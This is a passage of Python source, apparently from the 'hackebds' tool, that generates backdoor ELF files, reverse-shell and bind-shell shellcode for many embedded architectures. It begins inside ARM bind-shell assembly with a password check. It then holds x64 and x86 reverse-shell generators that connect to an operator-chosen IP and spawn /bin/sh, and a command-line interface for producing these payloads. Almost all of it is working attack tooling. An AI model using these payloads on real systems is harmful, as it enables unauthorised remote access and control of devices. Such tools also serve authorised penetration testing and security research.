    mov r7, #SYS_socket /* 0x119 */
    svc  #0
	'''

	shellcode += bind_shellcode

	shellcode += '''
	mov  r1,sp
	mov  r2,#0x10  
	mov r7, 0x11a
	svc #0
	mov r0,r6
	eor r1,r1
	mov r7,#284
	svc #0
	mov r0,r6
	eor r2,r2
	mov r7, 0x11d
	svc #0
	mov r6,r0

	mov r1,#2
	mov r0,r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	mov r0, r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	mov r0, r6
	mov r7, 63
	svc #0

	mov r7,#0x20
	strb r7,[sp,#-0x30]
	mov r7,#0x3a
	strb r7,[sp,#-0x31]
	mov r7,#0x64
	strb r7,[sp,#-0x32]
	mov r7,#0x77
	strb r7,[sp,#-0x33]
	mov r7,#0x73
	strb r7,[sp,#-0x34]
	mov r7,0x73
	strb r7,[sp,#-0x35]
	mov r7,0x61
	strb r7,[sp,#-0x36]
	mov r7,0x70
	strb r7,[sp,#-0x37]
	add r1,sp,-0x37
	mov r0,r6
	mov  r0, r6
	mov  r2, #8
	/* call write() */
	mov r7, #SYS_write /* 4 */
	svc  #0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov  r7,sp
	ldr  r1,[r7]
	'''
	
	shellcode += pass_cmd_shellcode

	shellcode +='''
	cmp  r1,r5
	'''
	shellcode = shellcode%(passwd_len)

	shellcode += '''
	bne main_exit
	'''

	shellcode += '''
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	strb r2, [sp,#0x20]
	push {r1}
	push {r0,r8}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''

	shellcode += '''
	main_exit:
	'''

	shellcode += shellcraft.exit(0)

	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,chars)
		my_package.my_make_elf(shellcode, filename)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			my_package.my_make_elf(shellcode, filename)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				my_package.my_make_elf(shellcode, filename)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



'''
this is help for print Using Help
'''
def Introduction():
	example_reverse = '''
    If you need to obtain more functions, use the following functions (One of them can):
    1. Visit github below: https://github.com/doudoudedi/hackEmbedded
    2. help(hackebds)
	'''
	print(example_reverse)



def x64el_backdoor(shell_path ,reverse_ip, reverse_port, envp,filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shell_path_list = []
	if shell_path == "/bin/bash" or shell_path == "bash":
		shell_path = "/bin/bash"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	elif shell_path == "/bin/sh" or shell_path == "sh":
		shell_path = "/bin/sh"
		shell_path_list.append(shell_path)
		shell_path_list.append("-i")
	else:
		log.info("now shell is only support sh and bash")
		return 
	if(envp == None):
		envp = 0
	else:
		envp = my_package.get_envir_args(envp)
	shellcode = shellcraft.connect(reverse_ip, reverse_port)
	shellcode += shellcraft.dup2("rbp",0)+shellcraft.dup2("rbp",1)+shellcraft.dup2("rbp",2)
	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def x64el_reverse_sl(reverse_ip, reverse_port):
	context.arch ='amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode = shellcraft.connect(reverse_ip,reverse_port)
	shellcode += shellcraft.dup2("rbp",0)+ shellcraft.dup2("rbp",1)+shellcraft.dup2("rbp",2)
	shellcode += shellcraft.execve("/bin/sh",["/bin/sh"],0)
	shellcode = asm(shellcode)
	shellcode_len = len(shellcode)
	shellcode_hex = ''
	shellcode_hex = extract_shellcode.extract_sl_print(shellcode, shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in {}".format(shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return shellcode

def x86el_reverse_sl(reverse_ip, reverse_port):
	context.arch = 'i386'
	context.endian = 'little'
	context.bits = '32'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode = shellcraft.connect(reverse_ip, reverse_port)
	shellcode += shellcraft.dup2("edx",0) + shellcraft.dup2("edx",1) + shellcraft.dup2("edx",2)
	shellcode += shellcraft.execve("/bin/sh",["/bin/sh"],0)
	shellcode = asm(shellcode)
	shellcode_len = len(shellcode)
	shellcode_hex = ''
	shellcode_hex = extract_shellcode.extract_sl_print(shellcode, shellcode_hex)
	if "\\x00" in shellcode_hex:
		#log.info("waiting 3s")
		#sleep(1)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in {}".format(shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return shellcode
	else:
		#log.info("waiting 3s")
		#sleep(1)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return shellcode

'''
def test1():
	context.arch = 'mips64'
	context.endian = 'big'
	context.bits = '64'
	return mips64el.sh()
'''

def get_version():
    return Fore.GREEN+"Version: 0.3.7"+Fore.RESET


'''
print model and arch list
'''

def model_list():
	model_choise.txt_to_dict()
	model_choise.print_mmodel_dic()


reverse_backdoor_dic = {
    1: mips_backdoor,
    2: mipsel_backdoor,
    3: mips64_backdoor,
    4: mips64el_backdoor,
    5: armelv5_backdoor,
    6: armelv7_backdoor,
    7: armebv5_backdoor,
    8: armebv7_backdoor,
    9: aarch64_backdoor,
    10: x86el_backdoor,
    11: x64el_backdoor,
    12: android_aarch64_backdoor,
    13: riscv64el_backdoor,
    14: powerpc_info.powerpc_backdoor,
    15: powerpc_info.powerpcle_backdoor,
	16: powerpc_info.powerpc64_backdoor,
	17: powerpc_info.powerpc64le_backdoor,
	18: sparc32.sparc_backdoor,
	19: None,
	20: sparc64.sparc64_backdoor,
	21: mips32n.mipsn32_backdoor,
	22: mips32n.mipsn32el_backdoor
}

reverse_shellcode_dic = {
	1: mips_reverse_sl,
	2: mipsel_reverse_sl,
	3: mips64_reverse_sl,
	4: mips64el_reverse_sl,
	5: armelv5_reverse_sl,
	6: armelv7_reverse_sl,
	7: armebv5_reverse_sl,
	8: armebv7_reverse_sl,
	9: aarch64_reverse_sl,
	10: x86el_reverse_sl,
	11: x64el_reverse_sl,
	12: None,
	13: None,
	14: powerpc_info.ppc_reverse_sl,
	15: powerpc_info.ppcle_reverse_sl,
	16: powerpc_info.ppc64_reverse_sl,
	17: powerpc_info.ppc64le_reverse_sl,
	18: None,
	19: None,
	20: None
}

hackebds_cmd_dic = {
	1: hackebds_cmd.mips_shell_cmd,
	2: hackebds_cmd.mipsel_shell_cmd,
	3: hackebds_cmd.mips64_cmd_file,
	4: hackebds_cmd.mips64el_cmd_file,
	5: hackebds_cmd.armelv5_shell_cmd,
	6: hackebds_cmd.armelv7_shell_cmd,
	7: hackebds_cmd.armebv5_shell_cmd,
	8: hackebds_cmd.armebv7_cmd_file,
	9: hackebds_cmd.aarch64_cmd_file,
	10: hackebds_cmd.x86_cmd_file,
	11: hackebds_cmd.x64_cmd_file,
	12: hackebds_cmd.aarch64_cmd_file,
	13: hackebds_cmd.riscv64el_cmd_file,
	14: hackebds_cmd.powerpc_cmd_file,
	15: hackebds_cmd.powerpcle_cmd_file,
	16: hackebds_cmd.powerpc64_cmd_file,
	17: hackebds_cmd.powerpc64le_cmd_file,
	18: hackebds_cmd.sparc_cmd_file,
	19: None,
	20: hackebds_cmd.sparc64_cmd_file
}

bind_shell_dic = {
	1: mips_bind_shell,
	2: mipsel_bind_shell,
	3: mips64_bind_shell,
	4: mips64el_bind_shell,
	5: armelv5_bind_shell,
	6: armelv7_bind_shell,
	7: armebv5_bind_shell,
	8: armv7eb_bind_shell,
	9: aarch64_bind_shell,
	10: x86_bind_shell,
	11: x64_bind_shell,
	12: android_aarch64_bindshell,
	13: riscv64el_bind_shell,
	14: powerpc_info.powerpc_bind_shell,
	15: None,
	16: None,
	17: None,
	18: sparc32.sparc_bind_shell,
	19: None,
	20: None,
	21: mips32n.mipsn32_bind_shell,
	22: mips32n.mipsn32el_bind_shell
}

power_reverse_shell = {
	1: power_reverse_shell.mips_power_reverse_shell,
	2: power_reverse_shell.mipsel_power_reverse_shell,
	3: power_reverse_shell.mips64_power_reverse_shell,
	4: power_reverse_shell.mips64el_power_reverse_shell,
	5: power_reverse_shell.armelv5_power_reverse_shell,
	6: power_reverse_shell.armelv7_power_reverse_shell,
	7: power_reverse_shell.armebv5_power_reverse_shell,
	8: power_reverse_shell.armebv7_power_reverse_shell,
	9: power_reverse_shell.aarch64_power_reverse_shell,
	10: power_reverse_shell.x86_power_reverse_shell,
	11: power_reverse_shell.x64_power_reverse_shell,
	12: power_reverse_shell.android_power_reverse_shell,
	13: power_reverse_shell.riscv64_power_reverse_shell,
	14: power_reverse_shell.powerpc_power_reverse_shell,
	15: power_reverse_shell.powerpcle_power_reverse_shell,
	16: None,
	17: None,
	18: power_reverse_shell.sparc_power_reverse_shell,
	19: None,
	20: power_reverse_shell.sparc64_power_reverse_shell,
	21: power_reverse_shell.mipsn32_power_reverse_shell,
	22: power_reverse_shell.mipsn32el_power_reverse_shell
}


power_bind_shell_dic = {
	1: power_bind_shell.mips_power_bind_shell,
	2: power_bind_shell.mipsel_power_bind_shell,
	3: power_bind_shell.mips64_power_bind_shell,
	4: power_bind_shell.mips64el_power_bind_shell,
	5: power_bind_shell.armelv5_power_bind_shell,
	6: power_bind_shell.armelv7_power_bind_shell,
	7: power_bind_shell.armebv5_power_bind_shell,
	8: power_bind_shell.armebv7_power_bind_shell,
	9: power_bind_shell.aarch64_power_bind_shell,
	10: power_bind_shell.x86_power_bind_shell,
	11: power_bind_shell.x64_power_bind_shell,
	12: power_bind_shell.android_power_bind_shell,
	13: power_bind_shell.riscv64_power_bind_shell,
	14: None,
	15: None,
	16: None,
	17: None,
	18: None,
	19: None,
	20: None,
	21: power_bind_shell.mips32n_power_bind_shell,
	22: power_bind_shell.mips32nel_power_bind_shell
}



arch_2_num_dic ={
	'mips': 1,
	'mipsel': 2,
	'mips64': 3,
	'mips64el': 4,
	'armelv5': 5,
	'armelv7': 6,
	'armebv5': 7,
	'armebv7': 8,
	'aarch64': 9,
	'x86': 10,
	'x64': 11,
	'android':  12,
	'riscv64': 13,
	'powerpc':  14,
	'powerpcle': 15,
	'powerpc64':16,
	'powerpc64le': 17,
	'sparc': 18,
	'sparcel': 19,
	'sparc64':20,
	'mipsn32' :21,
	'mipsn32el' :22

}


def arch_get_number(input_arch):

	fun = arch_2_num_dic.get(input_arch)
	return fun

def num_getreverse_file(number, shell_path,reverse_ip, reverse_port, envp,filename):

    fun = reverse_backdoor_dic.get(number)
    return fun(shell_path ,reverse_ip, reverse_port, envp,filename)

def num_getreverse_shellcode(number, reverse_ip, reverse_port):

	fun = reverse_shellcode_dic.get(number)
	return fun(reverse_ip, reverse_port)

def num_getbind_shell(number, listen_port, passwd, filename):

	fun = bind_shell_dic.get(number)
	return fun(listen_port, passwd, filename)

def num_get_file_cmd(number, CMD_PATH,CMD, envp,filename):
	fun = hackebds_cmd_dic.get(number)
	return fun(CMD, CMD_PATH , envp, filename)


def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp ,filename):
	fun = power_reverse_shell.get(num)
	return fun(shell_path, reverse_ip, reverse_port, envp,filename)

def num_get_power_bind_shell(num, shell_path, listen_port, passwd, envp,filename):
	fun = power_bind_shell_dic.get(num)
	return fun(shell_path, listen_port, passwd, envp,filename)


def check_ip(strip):
	try:
		socket.inet_aton(strip)
		return True
	except Exception as e:
		log.error("IP error")

def check_port(intport):
	if (intport >0 and intport<65535):
		return True
	else:
		log.error("port error")


def main():
	import argparse
	parser = argparse.ArgumentParser(
					usage= '',
                    prog = 'hackebds',
                    description = 'This tool is used for backdoor,shellcode generation,Information retrieval and POC arrangement for various architecture devices',
                    )
	parser.add_argument('-reverse_ip', required=False, type=str, default=None, help='reverse_ip set')
	parser.add_argument('-reverse_port', required=False, type=int, default=None ,help='reverse_port set')
	parser.add_argument('-arch', required=False, type=str, help='Target arch architecturet', choices=('aarch64', 'android', 'armebv5', 'armebv7', 'armelv5', 'armelv7', 'mips', 'mips64', 'mipsel', 'mips64el', 'mipsn32','mipsn32el','powerpc', 'powerpc64', 'powerpc64le', 'powerpcle', 'riscv64', 'sparc', 'sparc64', 'x64', 'x86'))
	parser.add_argument('-res', required=False,type=str,default=None, choices=('reverse_shell_file', 'reverse_shellcode', 'bind_shell','cmd_file','cveinfo'))
	parser.add_argument('-passwd', required=False, type=str,default="1234", help='bind_shell set connect passwd')
	parser.add_argument('-model', required=False, type=str ,default=None, help='device model,learn module')
	parser.add_argument('-bind_port', required=False, type=int,default=None, help='bind_shell port')
	parser.add_argument('-filename', required=False, type=str,default=None, help='Generate file name')
	parser.add_argument('-shell', required=False, type=str,default="/bin/sh", help='cmd shell or execute file path')
	parser.add_argument('-cmd', required=False, type=str,default=None, help='Commands executed')
	parser.add_argument('-envp', required=False, type=str,default=None, help='Commands envp')
	parser.add_argument('-encode', '--encode' ,action='store_true', help='encode backdoor')
	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell_file or bind_shell file')
	parser.add_argument('-s', '--search' ,action='store_true',help='Basic information and POC of search device')
	parser.add_argument('-l', '--list' ,action='store_true',help='print model information list')
	parser.add_argument('-p', '--poc' ,action='store_true',help='generated model\'s POC file')
	parser.add_argument('-v', '--version' ,action='version', version=get_version(), help='Display version')
	parser.add_argument('-CVE', '--CVE', required=False, type=str, default=None, help='CVE ID')
	parser.add_argument('-add', '--add_model', action='store_true', help='Add model tree\'s node')
	flag_cve_info = 0
	#@with_argparser(argparse)
	args = parser.parse_args()
	log.info("Initialize data file")
#try:
	if (os.path.exists(model_choise.model_tree_info_dicname) == True):
		model_choise.data_base_init()
		model_choise.dic_model_tree()
		model_choise.model_tree_dic()
	else:
		model_choise.make_dic()
		model_choise.data_base_init()
		model_choise.model_tree_dic()
#except Exception as e:
#	print(e)
#	log.info("Initialization fail")
	#except:
	#	print(e)
	#	log.info("Initialization fail")
	log.success("Initialization completed")
	#model_choise.demo_test()
	if (os.access("/tmp/hackebds_model_table", os.F_OK | os.R_OK | os.W_OK)):
		pass
	else:
		try:
			model_choise.touchfile()
		except Exception as e:
			args.model = None
			log.info("Unable to create model architecture relationship due to permission or other problems")
			pass

	log.success("Data file detection")
	if(args.list == True):
		model_choise.list_model_tree()
		return
	if(args.add_model == True):
		model_choise.add_model_info()
		return
	if (args.model != None):
		if (".." in args.model or "/" in args.model ):
			log.error("Illegal characters exist in")
			return
		if (args.poc == True and args.model != None):
			model_search_res = model_choise.search_model(args.model)
			model_choise.get_poc(model_search_res)
			return
		if (args.search == True):
			model_choise.search_model(args.model)
			return
	
	if args.model == None and args.CVE!= None:
		model_choise.search_CVE(args.CVE)

	if (args.res == None ):
		log.info("please use -h View Help")
		return

	if(args.arch != None and args.model != None):
		flag_cve_info = 1
		try:
			dic_arch = model_choise.model_to_arch(args.model)
			if (dic_arch == args.arch):
				args.arch = dic_arch
			else:
				model_choise.append_to_tree(args.model, args.arch)
			#args.arch = model_choise.model_to_arch(args.model)
			log.success("found relationship {} ------>{}".format(args.model, args.arch))
			model_choise.print_mmodel_dic()
			#print(args.arch)
		except Exception as e:
			model = args.model
			args.model = None
			log.info("There is no cross reference relationship locally, adding the corresponding relationship, can be edited manually /tmp/hackebds_model_table")
			#print(e)
			if (args.arch ==None):
				log.info("arch not set")
				return
			log.success("Establishing relationship")
			log.info("Please make sure arch is set correctly, If necessary, you can modify /tmp/hackebds_model_table")
			log.success("{} ---> {}, After that, you only need to specify {}, not the arch".format(model ,args.arch, model))
			model_choise.append_to_tree(model, args.arch)
			model_choise.print_mmodel_dic()

	if (args.model != None and args.arch==None):
		try:
			flag_cve_info  = 1
			args.arch = model_choise.model_to_arch(args.model)
			log.success("found relationship {} ------>{}".format(args.model, args.arch))
			model_choise.print_mmodel_dic()
		except:
			log.info("There is no cross reference relationship locally, please set -arch building relationships, can be edited manually /tmp/hackebds_model_table")
			return

	if(args.model == None and args.arch==None):
		log.info("please set arch or model")
		return

	if (args.res == "reverse_shell_file" and args.arch != None and args.encode == False ):
		if (args.reverse_ip!=None and args.reverse_port != None):
			if (check_ip(args.reverse_ip)==True and check_port(args.reverse_port)==True):
				if(args.power == True):
					num_get_power_reverse_shell(arch_get_number(args.arch), args.shell,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
					return
				else:
					try:
						num_getreverse_file(arch_get_number(args.arch), args.shell ,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
						return

					except Exception as e:
						print(e)
						log.info("please check your IP format and PORT ,If it is correct then The function is still under development or environmental problems")
						return
			else:
				log.info("IP or PORT format error")
				return
		else:
			log.info("please set reverse_ip or reverse_port")
			return

	if (args.res == "reverse_shellcode" and args.arch != None and args.encode == False ):
		if (args.reverse_ip!=None and args.reverse_port != None):
			if (check_ip(args.reverse_ip)==True and check_port(args.reverse_port)==True):
				try:
					num_getreverse_shellcode(arch_get_number(args.arch), args.reverse_ip, args.reverse_port)
					return

				except Exception as e:
					log.info("please check your IP format and PORT ,If it is correct then function is still under development or environmental problems")
					return
			else:
				log.info("IP or PORT format error")
				return
		else:
			log.error("please set reverse_ip or reverse_port")

	if (args.res == "bind_shell"):
		try:
			if (args.passwd!=None and args.bind_port != None and args.arch!=None and args.encode == False ):
				if (check_port(args.bind_port)==True):
					if (args.power == True):
						num_get_power_bind_shell(arch_get_number(args.arch), args.shell ,args.bind_port, args.passwd, args.envp ,args.filename)
						return

					else:
						num_getbind_shell(arch_get_number(args.arch), args.bind_port, args.passwd, args.filename)
						return
				else:
					log.info("PORT format error")
					return
			else:
				log.info("please set bind passwd or bind_port")
				return
		except Exception as e:
			print(e)
			log.info("please check your IP format and PORT ,If it is correct then function is still under development or environmental problems")
			return
			#pass

	if (flag_cve_info == 1 and args.res=="cveinfo" ):
		cve_info.main(args.model)
		return

	if (args.res == "cmd_file" and args.arch != None and args.encode == False ):
		if(args.cmd != None):
			try:
				num_get_file_cmd(arch_get_number(args.arch), args.shell, args.cmd, args.envp,args.filename)
				return
			except Exception as e:
				log.info("function is still under development or environmental problems")
				return
		else:
			log.info("please set command")
			return
	else:
		log.info("function is still under development or environmental problems")
		return
